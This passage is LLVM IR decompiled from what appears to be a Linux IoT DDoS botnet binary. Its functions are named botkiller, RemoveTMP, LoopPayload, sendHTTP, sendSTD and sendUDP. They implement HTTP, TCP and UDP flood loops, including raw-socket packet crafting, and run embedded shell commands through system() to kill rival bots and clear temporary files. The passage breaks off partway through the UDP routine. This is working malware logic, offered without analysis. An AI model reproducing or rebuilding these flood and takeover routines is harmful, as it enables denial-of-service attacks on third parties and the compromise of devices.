  uselistorder label %dec_label_pc_805cc2b, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_805bb26, { 1, 0 }
  uselistorder label %dec_label_pc_805bad8, { 1, 0 }
  uselistorder label %dec_label_pc_805ba54, { 1, 0 }
}

define i32 @LoopPayload() local_unnamed_addr {
entry:
  %v2_805cc5a = call i32 @__libc_system(i32 ptrtoint ([324 x i8]* @global_var_8068404.1328 to i32))
  ret i32 %v2_805cc5a
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-380 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805cc73 = load i32, i32* @ebx, align 4
  store i32 %v0_805cc73, i32* %stack_var_-12, align 4
  %v5_805ccdb = bitcast i32* %stack_var_-156 to i8*
  %v6_805ccdb = call i32 @memcpy(i8* %v5_805ccdb, i32 ptrtoint ([23 x i8*]* @global_var_806cc60.1361 to i32), i32 92)
  %v5_805cd8d = icmp sgt i32 %tmp34, 0
  br i1 %v5_805cd8d, label %dec_label_pc_805cd93, label %dec_label_pc_805ce92

dec_label_pc_805cd93:                             ; preds = %entry
  %v2_805cda3 = ptrtoint i32* %stack_var_-508 to i32
  %v5_805cdac = bitcast i32* %stack_var_-508 to i8*
  %v6_805cdac = call i32 @__GI_memset(i8* %v5_805cdac, i32 0, i32 128)
  %v0_805ce14 = load i32, i32* @ebp, align 4
  %v4_805cdc4 = add i32 %v0_805ce14, -60
  %v5_805cdc4 = inttoptr i32 %v4_805cdc4 to i32*
  %v6_805cdcb = load i32, i32* %v5_805cdc4, align 4
  store i32 %v6_805cdcb, i32* @ebx, align 4
  %v6_805cdd2 = load i32, i32* %v5_805cdc4, align 4
  %v8_805ce0a = call i32 @__GI_snprintf(i32 %v2_805cda3, i32 127, i32 ptrtoint ([100 x i8]* @global_var_806cd44.1371 to i32), i32 %v6_805cdd2, i32 %v6_805cdd2, i32 %v6_805cdcb)
  %v1_805ce59 = call i32 @__libc_system(i32 %v2_805cda3)
  %v2_805ce74 = ptrtoint i32* %stack_var_-380 to i32
  %v3_805ce7d = call i32 @sprintf(i32 %v2_805ce74, i32 ptrtoint ([14 x i8]* @global_var_806cdc5.1373 to i32))
  %v1_805ce8b = call i32 @__libc_system(i32 %v2_805ce74)
  br label %dec_label_pc_805ce9e

dec_label_pc_805ce92:                             ; preds = %entry
  %v1_805ce99 = call i32 @sleep(i32 5)
  br label %dec_label_pc_805ce9e

dec_label_pc_805ce9e:                             ; preds = %dec_label_pc_805cd93, %dec_label_pc_805ce92
  %storemerge29 = phi i32 [ %v1_805ce99, %dec_label_pc_805ce92 ], [ %v1_805ce8b, %dec_label_pc_805cd93 ]
  %v2_805cea4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805cea4, i32* @ebx, align 4
  ret i32 %storemerge29

; uselistorder directives
  uselistorder i32 %v6_805cdd2, { 1, 0 }
  uselistorder i32* %v5_805cdc4, { 1, 0 }
  uselistorder i32 %v2_805cda3, { 1, 0 }
  uselistorder label %dec_label_pc_805ce9e, { 1, 0 }
}

define i32 @RemoveTMP() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805cea8 = load i32, i32* @ebp, align 4
  store i32 %v0_805cea8, i32* %stack_var_-4, align 4
  %v2_805ceb5 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_806cdd4.1374 to i32))
  %v2_805cec1 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_806cdff.1375 to i32))
  %v2_805cecd = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_806ce14.1376 to i32))
  %v2_805ced9 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_806cdff.1375 to i32))
  %v2_805cee5 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_806ce2a.1377 to i32))
  %v2_805cef1 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_806ce38.1378 to i32))
  %v2_805cefd = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_806ce43.1379 to i32))
  %v2_805cf09 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_806ce5a.1380 to i32))
  %v2_805cf15 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_806ce6e.1381 to i32))
  %v2_805cf21 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_806ce79.1382 to i32))
  %v2_805cf2d = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_806ce8a.1383 to i32))
  %v2_805cf39 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_806ce98.1384 to i32))
  %v2_805cf45 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_806ceb0.1385 to i32))
  %v2_805cf4a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805cf4a, i32* @ebp, align 4
  ret i32 %v2_805cf45
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805cf4c = load i32, i32* @ebp, align 4
  store i32 %v0_805cf4c, i32* %stack_var_-4, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_805cf66 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_805cf6e = icmp eq i32 %v1_805cf66, 0
  %v1_805cf72 = icmp eq i1 %v4_805cf6e, false
  br i1 %v1_805cf72, label %dec_label_pc_805cf80, label %dec_label_pc_805d042

dec_label_pc_805cf80:                             ; preds = %entry
  %v1_805cf83 = add i32 %v1_805cf66, 12
  %v2_805cf83 = inttoptr i32 %v1_805cf83 to i32*
  %v3_805cf83 = load i32, i32* %v2_805cf83, align 4
  %v1_805cf8b = add i32 %v1_805cf66, 16
  %v2_805cf8b = inttoptr i32 %v1_805cf8b to i32*
  %v3_805cf8b = load i32, i32* %v2_805cf8b, align 4
  %v1_805cf8e = inttoptr i32 %v3_805cf8b to i32*
  %v2_805cf8e = load i32, i32* %v1_805cf8e, align 4
  %v15_805cf97 = ptrtoint i32* %stack_var_-24 to i32
  %v3_805cfa1 = call i32 @bcopy(i32 %v2_805cf8e, i32 %v15_805cf97, i32 %v3_805cf83)
  %v2_805cfad = call i32 @__GI_htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_805cfd3 = call i32 @socket(i32 2)
  %v2_805cfe3 = ptrtoint i32* %stack_var_-32 to i32
  %v5_805d000 = call i32 @__GI_setsockopt(i32 %v3_805cfd3, i32 6, i32 1, i32 %v2_805cfe3, i32 4)
  %v13_805d005 = icmp eq i32 %v3_805cfd3, -1
  %v1_805d009 = icmp eq i1 %v13_805d005, false
  br i1 %v1_805d009, label %dec_label_pc_805d014, label %dec_label_pc_805d042

dec_label_pc_805d014:                             ; preds = %dec_label_pc_805cf80
  %v2_805cf94 = ptrtoint i32* %stack_var_-28 to i32
  %v3_805d029 = call i32 @__libc_connect(i32 %v3_805cfd3, i32 %v2_805cf94, i32 16)
  %v10_805d02e = icmp eq i32 %v3_805d029, -1
  %v1_805d031 = icmp eq i1 %v10_805d02e, false
  br i1 %v1_805d031, label %dec_label_pc_805d03c, label %dec_label_pc_805d042

dec_label_pc_805d03c:                             ; preds = %dec_label_pc_805d014
  br label %dec_label_pc_805d042

dec_label_pc_805d042:                             ; preds = %dec_label_pc_805d014, %dec_label_pc_805cf80, %entry, %dec_label_pc_805d03c
  %stack_var_-44.0 = phi i32 [ %v3_805cfd3, %dec_label_pc_805d03c ], [ 0, %entry ], [ 0, %dec_label_pc_805cf80 ], [ 0, %dec_label_pc_805d014 ]
  %v2_805d045 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805d045, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_805cfd3, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_805d042, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp27 = trunc i32 %arg3 to i16
  %stack_var_-796 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %tmp34 = bitcast i32* %stack_var_-272 to i8*
  %v6_805d076 = call i32 @memcpy(i8* %tmp34, i32 ptrtoint ([62 x i8*]* @global_var_806e240.1448 to i32), i32 248)
  %v3_805d0a0 = call i32 @__GI_time(i32* null)
  %v5_805d0a5 = add i32 %v3_805d0a0, %arg5
  %v1_805d0ab = call i32 @random()
  %v2_805d0ce = srem i32 %v1_805d0ab, 65
  %v0_805d0f5 = load i32, i32* @ebp, align 4
  %v2_805d0f5 = mul nsw i32 %v2_805d0ce, 4
  %v3_805d0f5 = add i32 %v0_805d0f5, -268
  %v4_805d0f5 = add i32 %v3_805d0f5, %v2_805d0f5
  %v5_805d0f5 = inttoptr i32 %v4_805d0f5 to i32*
  %v6_805d0f5 = load i32, i32* %v5_805d0f5, align 4
  store i32 %v6_805d0f5, i32* @ebx, align 4
  %v1_805d0fc = call i32 @random()
  %v2_805d179 = ptrtoint i32* %stack_var_-796 to i32
  %tmp35 = bitcast i32* %stack_var_-796 to i8*
  %v4_805d182 = call i32 @sprintf(i32 %v2_805d179, i32 ptrtoint ([62 x i8]* @global_var_806e350.1452 to i32))
  %v4_805d1a2 = ptrtoint i8* %arg1 to i32
  %v5_805d21350 = icmp sgt i32 %arg6, 0
  br i1 %v5_805d21350, label %dec_label_pc_805d190, label %dec_label_pc_805d219

dec_label_pc_805d190:                             ; preds = %entry, %dec_label_pc_805d209
  %storemerge51 = phi i32 [ %v4_805d209, %dec_label_pc_805d209 ], [ 0, %entry ]
  %v1_805d190 = call i32 @__libc_fork(i32 %storemerge51)
  %v1_805d195 = icmp eq i32 %v1_805d190, 0
  br i1 %v1_805d195, label %dec_label_pc_805d209, label %dec_label_pc_805d1ec.preheader

dec_label_pc_805d1ec.preheader:                   ; preds = %dec_label_pc_805d190
  %v3_805d1f336 = call i32 @__GI_time(i32* null)
  %v5_805d1fb44 = icmp slt i32 %v3_805d1f336, %v5_805d0a5
  br i1 %v5_805d1fb44, label %dec_label_pc_805d19b, label %dec_label_pc_805d1fd

dec_label_pc_805d19b:                             ; preds = %dec_label_pc_805d1ec.preheader, %dec_label_pc_805d1ec.backedge
  %v5_805d1ac = call i32 @socket_connect(i32 %v4_805d1a2, i16 %tmp27)
  %v4_805d1b4 = icmp eq i32 %v5_805d1ac, 0
  br i1 %v4_805d1b4, label %dec_label_pc_805d1ec.backedge, label %dec_label_pc_805d1ba

dec_label_pc_805d1ba:                             ; preds = %dec_label_pc_805d19b
  %v3_805d1c3 = call i32 @strlen(i8* %tmp35)
  store i32 %v5_805d1ac, i32* @eax, align 4
  %v5_805d1dc = call i32 @__GI___libc_write(i32 %v5_805d1ac, i32 %v2_805d179, i32 %v3_805d1c3)
  store i32 %v5_805d1ac, i32* @eax, align 4
  %v2_805d1e7 = call i32 @__GI___libc_close(i32 %v5_805d1ac)
  br label %dec_label_pc_805d1ec.backedge

dec_label_pc_805d1ec.backedge:                    ; preds = %dec_label_pc_805d1ba, %dec_label_pc_805d19b
  %v3_805d1f3 = call i32 @__GI_time(i32* null)
  %v5_805d1fb = icmp slt i32 %v3_805d1f3, %v5_805d0a5
  br i1 %v5_805d1fb, label %dec_label_pc_805d19b, label %dec_label_pc_805d1fd

dec_label_pc_805d1fd:                             ; preds = %dec_label_pc_805d1ec.backedge, %dec_label_pc_805d1ec.preheader
  %v2_805d204 = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_805d209

dec_label_pc_805d209:                             ; preds = %dec_label_pc_805d190, %dec_label_pc_805d1fd
  %v4_805d209 = add nuw nsw i32 %storemerge51, 1
  %exitcond = icmp eq i32 %v4_805d209, %arg6
  br i1 %exitcond, label %dec_label_pc_805d219, label %dec_label_pc_805d190

dec_label_pc_805d219:                             ; preds = %dec_label_pc_805d209, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_805d209 ]
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_805d209, { 1, 0 }
  uselistorder i32 %v5_805d1ac, { 1, 0, 3, 2, 4 }
  uselistorder i32 %storemerge51, { 1, 0 }
  uselistorder i32 %v5_805d0a5, { 1, 0 }
  uselistorder label %dec_label_pc_805d209, { 1, 0 }
  uselistorder label %dec_label_pc_805d19b, { 1, 0 }
  uselistorder label %dec_label_pc_805d190, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805d222 = load i32, i32* @ebp, align 4
  store i32 %v0_805d222, i32* %stack_var_-4, align 4
  %v4_805d222 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805d222, i32* @ebp, align 4
  %v4_805d242 = call i32 @socket(i32 2)
  %v2_805d251 = call i32 @__GI_time(i32* null)
  %v1_805d25f = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_805d26f = ptrtoint i32* %stack_var_-40 to i32
  %v3_805d275 = call i32 @bzero(i32 %v2_805d26f, i32 16)
  %v1_805d27d = add i32 %v1_805d25f, 12
  %v2_805d27d = inttoptr i32 %v1_805d27d to i32*
  %v3_805d27d = load i32, i32* %v2_805d27d, align 4
  %v1_805d285 = add i32 %v1_805d25f, 16
  %v2_805d285 = inttoptr i32 %v1_805d285 to i32*
  %v3_805d285 = load i32, i32* %v2_805d285, align 4
  %v1_805d288 = inttoptr i32 %v3_805d285 to i32*
  %v2_805d288 = load i32, i32* %v1_805d288, align 4
  %v15_805d291 = ptrtoint i32* %stack_var_-36 to i32
  %v4_805d29b = call i32 @bcopy(i32 %v2_805d288, i32 %v15_805d291, i32 %v3_805d27d)
  %v1_805d2a3 = add i32 %v1_805d25f, 8
  %v2_805d2a3 = inttoptr i32 %v1_805d2a3 to i32*
  %v3_805d2a3 = load i32, i32* %v2_805d2a3, align 4
  store i32 %v3_805d2a3, i32* %stack_var_-40, align 4
  %v4_805d2d3 = bitcast i32* %stack_var_-184 to i8*
  %v5_805d37b = add i32 %v2_805d251, %arg3
  br label %dec_label_pc_805d2b8

dec_label_pc_805d2b8:                             ; preds = %dec_label_pc_805d3a0, %entry
  %storemerge = phi i32 [ %v4_805d3a0, %dec_label_pc_805d3a0 ], [ 0, %entry ]
  %v5_805d2d3 = call i32 @memcpy(i8* %v4_805d2d3, i32 ptrtoint ([36 x i8*]* @global_var_806e520.1489 to i32), i32 144)
  %v0_805d2d8 = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_805d3a0, label %dec_label_pc_805d32e

dec_label_pc_805d32e:                             ; preds = %dec_label_pc_805d2b8
  %v0_805d31e = load i32, i32* @ebp, align 4
  %v3_805d31e = add i32 %v0_805d31e, -180
  %v2_805d2f3 = udiv i32 %v0_805d2d8, 36
  %tmp27 = mul nsw i32 %v2_805d2f3, -4
  %v2_805d310 = add i32 %v0_805d2d8, %tmp27
  %v2_805d31e = mul i32 %v2_805d310, 4
  %v4_805d31e = add i32 %v3_805d31e, %v2_805d31e
  %v5_805d31e = inttoptr i32 %v4_805d31e to i32*
  %v6_805d31e = load i32, i32* %v5_805d31e, align 4
  %v5_805d34b = call i32 @__libc_send(i32 %v4_805d242, i32 %v6_805d31e, i32 50, i32 0)
  %v4_805d365 = call i32 @__libc_connect(i32 %v4_805d242, i32 %v2_805d26f, i32 16)
  %v2_805d371 = call i32 @__GI_time(i32* null)
  %v5_805d380 = icmp slt i32 %v2_805d371, %v5_805d37b
  br i1 %v5_805d380, label %dec_label_pc_805d3a0, label %dec_label_pc_805d382

dec_label_pc_805d382:                             ; preds = %dec_label_pc_805d32e
  store i32 %v4_805d242, i32* @eax, align 4
  %v1_805d388 = call i32 @__GI___libc_close(i32 %v4_805d242)
  %v1_805d394 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805d3a0

dec_label_pc_805d3a0:                             ; preds = %dec_label_pc_805d382, %dec_label_pc_805d32e, %dec_label_pc_805d2b8
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_805d2b8 ], [ 0, %dec_label_pc_805d32e ], [ 0, %dec_label_pc_805d382 ]
  %v4_805d3a0 = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_805d2b8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_805d25f, { 2, 1, 0 }
  uselistorder i32 %v4_805d242, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_4()
  %tmp26 = call i16 @__decompiler_undefined_function_4()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %v15_805d3ad = ptrtoint i8** %stack_var_-124 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_805d3b6 = icmp eq i32 %arg2, 0
  %v1_805d3ba = icmp eq i1 %v4_805d3b6, false
  br i1 %v1_805d3ba, label %dec_label_pc_805d3c7, label %dec_label_pc_805d3bc

dec_label_pc_805d3bc:                             ; preds = %entry
  %v1_805d3bc = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_805d3d9

dec_label_pc_805d3c7:                             ; preds = %entry
  %v1_805d3ca = urem i32 %arg2, 65536
  store i32 %v1_805d3ca, i32* %eax.global-to-local, align 4
  %v4_805d3cd = inttoptr i32 %v1_805d3ca to i8*
  store i8* %v4_805d3cd, i8** %stack_var_-124, align 4
  %v2_805d3d0 = trunc i32 %arg2 to i16
  %v3_805d3d0 = call i32 @__GI_htons(i16 %v2_805d3d0)
  store i32 %v3_805d3d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d3d9

dec_label_pc_805d3d9:                             ; preds = %dec_label_pc_805d3bc, %dec_label_pc_805d3c7
  %v2_805d3d9 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_805d3e6 = inttoptr i32 %arg1 to i8*
  store i8* %v4_805d3e6, i8** %stack_var_-124, align 4
  %v5_805d3e9 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v5_805d3e9, i32* %eax.global-to-local, align 4
  %v1_805d3ee = icmp eq i32 %v5_805d3e9, 0
  %v1_805d3f0 = icmp eq i1 %v1_805d3ee, false
  br i1 %v1_805d3f0, label %dec_label_pc_805d83d, label %dec_label_pc_805d3f6

dec_label_pc_805d3f6:                             ; preds = %dec_label_pc_805d3d9
  %v15_805d409 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v15_805d409, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-60 to i8*
  store i8* %tmp61, i8** %stack_var_-124, align 4
  %v6_805d40f = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 8)
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_805d41a = icmp eq i32 %arg4, 32
  %v1_805d41e = icmp eq i1 %v9_805d41a, false
  br i1 %v1_805d41e, label %dec_label_pc_805d531, label %dec_label_pc_805d424

dec_label_pc_805d424:                             ; preds = %dec_label_pc_805d3f6
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-124, align 4
  %v5_805d43b = call i32 @socket(i32 2)
  store i32 %v5_805d43b, i32* %eax.global-to-local, align 4
  %v4_805d443 = icmp eq i32 %v5_805d43b, 0
  %v1_805d447 = icmp eq i1 %v4_805d443, false
  br i1 %v1_805d447, label %dec_label_pc_805d463, label %dec_label_pc_805d449

dec_label_pc_805d449:                             ; preds = %dec_label_pc_805d424
  %v0_805d449 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805d449 = ptrtoint i8* %v0_805d449 to i32
  store i32 %v1_805d449, i32* %eax.global-to-local, align 4
  store i8* %v0_805d449, i8** %stack_var_-124, align 4
  %v4_805d459 = call i32 @HackerPrint(i32 %v1_805d449, i32 ptrtoint ([27 x i8]* @global_var_806e5b0.1490 to i32))
  store i32 %v4_805d459, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d83d

dec_label_pc_805d463:                             ; preds = %dec_label_pc_805d424
  %v1_805d466 = add i32 %arg5, 1
  store i32 %v1_805d466, i32* %eax.global-to-local, align 4
  %v4_805d469 = inttoptr i32 %v1_805d466 to i8*
  store i8* %v4_805d469, i8** %stack_var_-124, align 4
  %v2_805d46c = call i32 @malloc(i32 %v1_805d466)
  store i32 %v2_805d46c, i32* %eax.global-to-local, align 4
  %v4_805d474 = icmp eq i32 %v2_805d46c, 0
  br i1 %v4_805d474, label %dec_label_pc_805d83d, label %dec_label_pc_805d47e

dec_label_pc_805d47e:                             ; preds = %dec_label_pc_805d463
  store i32 %v2_805d46c, i32* %eax.global-to-local, align 4
  %v4_805d493 = inttoptr i32 %v2_805d46c to i8*
  store i8* %v4_805d493, i8** %stack_var_-124, align 4
  %v6_805d496 = call i32 @__GI_memset(i8* %v4_805d493, i32 0, i32 %v1_805d466)
  store i32 %v2_805d46c, i32* %eax.global-to-local, align 4
  store i8* %v4_805d493, i8** %stack_var_-124, align 4
  %v5_805d4a8 = call i32 @makeRandomStr(i8* %v4_805d493, i32 %arg5)
  store i32 %v5_805d4a8, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-124, align 4
  %v3_805d4b4 = call i32 @__GI_time(i32* null)
  %v5_805d4b9 = add i32 %v3_805d4b4, %arg3
  store i32 %v5_805d4b9, i32* %eax.global-to-local, align 4
  %v4_805d4ee = inttoptr i32 %v5_805d43b to i8*
  br label %dec_label_pc_805d4c6

dec_label_pc_805d4c6:                             ; preds = %dec_label_pc_805d50d, %dec_label_pc_805d52b, %dec_label_pc_805d47e
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_805d47e ], [ %v4_805d52b, %dec_label_pc_805d52b ], [ 0, %dec_label_pc_805d50d ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v5_805d43b, i32* %eax.global-to-local, align 4
  store i8* %v4_805d4ee, i8** %stack_var_-124, align 4
  %v8_805d4f1 = call i32 @__libc_sendto(i32 %v5_805d43b, i32 %v2_805d46c, i32 %arg5, i32 0, i32 %v2_805d3d9, i32 16)
  store i32 %v8_805d4f1, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_805d4f9 = icmp eq i32 %stack_var_-80.0, %arg6
  %v1_805d4fc = icmp eq i1 %v15_805d4f9, false
  br i1 %v1_805d4fc, label %dec_label_pc_805d52b, label %dec_label_pc_805d4fe

dec_label_pc_805d4fe:                             ; preds = %dec_label_pc_805d4c6
  br i1 %v1_805d3ba, label %dec_label_pc_805d50d, label %dec_label_pc_805d504

dec_label_pc_805d504:                             ; preds = %dec_label_pc_805d4fe
  %v0_805d504 = load i8*, i8** %stack_var_-124, align 4
  %v1_805d504 = ptrtoint i8* %v0_805d504 to i32
  %v2_805d504 = call i32 @rand_cmwc(i32 %v1_805d504)
  store i32 %v2_805d504, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d50d

dec_label_pc_805d50d:                             ; preds = %dec_label_pc_805d4fe, %dec_label_pc_805d504
  store i8* null, i8** %stack_var_-124, align 4
  %v3_805d514 = call i32 @__GI_time(i32* null)
  store i32 %v3_805d514, i32* %eax.global-to-local, align 4
  %v8_805d51c = icmp sgt i32 %v3_805d514, %v5_805d4b9
  br i1 %v8_805d51c, label %dec_label_pc_805d83d, label %dec_label_pc_805d4c6

dec_label_pc_805d52b:                             ; preds = %dec_label_pc_805d4c6
  %v4_805d52b = add i32 %stack_var_-80.0, 1
  br label %dec_label_pc_805d4c6

dec_label_pc_805d531:                             ; preds = %dec_label_pc_805d3f6
  store i32 %v15_805d3ad, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-124, align 4
  %v5_805d54d = call i32 @socket(i32 2)
  store i32 %v5_805d54d, i32* %eax.global-to-local, align 4
  %v4_805d555 = icmp eq i32 %v5_805d54d, 0
  %v1_805d559 = icmp eq i1 %v4_805d555, false
  br i1 %v1_805d559, label %dec_label_pc_805d575, label %dec_label_pc_805d55b

dec_label_pc_805d55b:                             ; preds = %dec_label_pc_805d531
  %v0_805d55b = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805d55b = ptrtoint i8* %v0_805d55b to i32
  store i32 %v1_805d55b, i32* %eax.global-to-local, align 4
  store i8* %v0_805d55b, i8** %stack_var_-124, align 4
  %v4_805d56b = call i32 @HackerPrint(i32 %v1_805d55b, i32 ptrtoint ([27 x i8]* @global_var_806e5b0.1490 to i32))
  store i32 %v4_805d56b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d83a

dec_label_pc_805d575:                             ; preds = %dec_label_pc_805d531
  store i32 1, i32* %stack_var_-72, align 4
  %v2_805d584 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v5_805d54d, i32* %eax.global-to-local, align 4
  %v4_805d59e = inttoptr i32 %v5_805d54d to i8*
  store i8* %v4_805d59e, i8** %stack_var_-124, align 4
  %v7_805d5a1 = call i32 @__GI_setsockopt(i32 %v5_805d54d, i32 0, i32 3, i32 %v2_805d584, i32 4)
  store i32 %v7_805d5a1, i32* %eax.global-to-local, align 4
  %v2_805d5a6 = icmp slt i32 %v7_805d5a1, 0
  %v1_805d5a8 = icmp eq i1 %v2_805d5a6, false
  br i1 %v1_805d5a8, label %dec_label_pc_805d5f7.preheader, label %dec_label_pc_805d5aa

dec_label_pc_805d5f7.preheader:                   ; preds = %dec_label_pc_805d575
  br label %dec_label_pc_805d5cd

dec_label_pc_805d5aa:                             ; preds = %dec_label_pc_805d575
  %v0_805d5aa = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805d5aa = ptrtoint i8* %v0_805d5aa to i32
  store i32 %v1_805d5aa, i32* %eax.global-to-local, align 4
  store i8* %v0_805d5aa, i8** %stack_var_-124, align 4
  %v4_805d5ba = call i32 @HackerPrint(i32 %v1_805d5aa, i32 ptrtoint ([33 x i8]* @global_var_806e5cc.1491 to i32))
  store i32 %v4_805d5ba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d83a

dec_label_pc_805d5cd:                             ; preds = %dec_label_pc_805d5f7.preheader, %dec_label_pc_805d5cd
  %v4_805d5f763 = phi i32 [ 49, %dec_label_pc_805d5f7.preheader ], [ %v4_805d5f7, %dec_label_pc_805d5cd ]
  store i8* null, i8** %stack_var_-124, align 4
  %v3_805d5d4 = call i32 @__GI_time(i32* null)
  store i32 %v3_805d5d4, i32* %eax.global-to-local, align 4
  store i32 %v3_805d5d4, i32* @ebx, align 4
  %v0_805d5db = load i8*, i8** %stack_var_-124, align 4
  %v1_805d5db = ptrtoint i8* %v0_805d5db to i32
  %v2_805d5db = call i32 @rand_cmwc(i32 %v1_805d5db)
  %v1_805d5e0 = load i32, i32* @ebx, align 4
  %v2_805d5e0 = xor i32 %v1_805d5e0, %v2_805d5db
  store i32 %v2_805d5e0, i32* %eax.global-to-local, align 4
  %v4_805d5e2 = inttoptr i32 %v2_805d5e0 to i8*
  store i8* %v4_805d5e2, i8** %stack_var_-124, align 4
  %v2_805d5e5 = call i32 @srand(i32 %v2_805d5e0)
  store i32 %v2_805d5e5, i32* %eax.global-to-local, align 4
  %v0_805d5ea = call i32 @random()
  store i32 %v0_805d5ea, i32* %eax.global-to-local, align 4
  %v4_805d5ef = inttoptr i32 %v0_805d5ea to i8*
  store i8* %v4_805d5ef, i8** %stack_var_-124, align 4
  %v2_805d5f2 = call i32 @init_rand(i32 %v0_805d5ea)
  store i32 %v2_805d5f2, i32* %eax.global-to-local, align 4
  %v4_805d5f7 = add nsw i32 %v4_805d5f763, -1
  %v8_805d5f7 = icmp eq i32 %v4_805d5f763, 0
  %v1_805d5ff = icmp eq i1 %v8_805d5f7, false
  br i1 %v1_805d5ff, label %dec_label_pc_805d5cd, label %dec_label_pc_805d601

dec_label_pc_805d601:                             ; preds = %dec_label_pc_805d5cd
  %v4_805d601 = icmp eq i32 %arg4, 0
  %v1_805d605 = icmp eq i1 %v4_805d601, false
  br i1 %v1_805d605, label %dec_label_pc_805d610, label %dec_label_pc_805d626

dec_label_pc_805d610:                             ; preds = %dec_label_pc_805d601
  %v5_805d617 = sub i32 32, %arg4
  %v2_805d61f = urem i32 %v5_805d617, 32
  %v4_805d61f = icmp eq i32 %v2_805d61f, 0
  br i1 %v4_805d61f, label %bb62, label %bb

